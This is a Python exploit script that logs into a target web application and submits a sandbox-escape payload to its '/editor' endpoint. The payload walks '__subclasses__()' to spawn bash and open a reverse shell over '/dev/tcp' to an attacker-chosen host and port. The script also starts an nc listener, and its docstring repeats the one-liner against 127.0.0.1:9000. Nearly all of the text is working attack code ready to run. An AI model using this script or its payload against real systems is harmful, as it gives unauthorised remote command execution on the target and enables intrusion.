#!/usr/bin/python3

'''
PoC: 
    "".__class__.__mro__[1].__subclasses__()[425](['/bin/bash','-c','bash -i >& /dev/tcp/127.0.0.1/9000 0>&1'])
'''

import sys
import subprocess
import urllib.parse
import requests

# ARGUMENTS
if len(sys.argv) != 6:
	print("usage: %s target lhost lport email password"%sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
email = sys.argv[4]
passwd = sys.argv[5]

# PAYLOAD
print("[+] Generating payload...")
payload = "\"\".__class__.__mro__[1].__subclasses__()[425](['/bin/bash','-c','bash -i >& /dev/tcp/%s/%s 0>&1'])"%(lhost,lport)

# LOG IN
print("[+] Logging in...")
s = requests.Session()
h = {'Content-Type':'application/x-www-form-urlencoded'}
d = {'email':email,'password':passwd}
s.post('http://%s/login'%target,data=d,headers=h)

# OPEN LISTENER
print("[+] Opening listener...")
subprocess.Popen(["nc","-nvlp",lport])

# SUBMIT EDITOR REQUEST
print("[+] Sending code to editor...")
d = 'code=%s'%urllib.parse.quote(payload)
s.post('http://%s/editor'%target,data=d,headers=h,proxies={'http':'http://127.0.0.1:8080'})

# Keep shell open
while True:
	pass
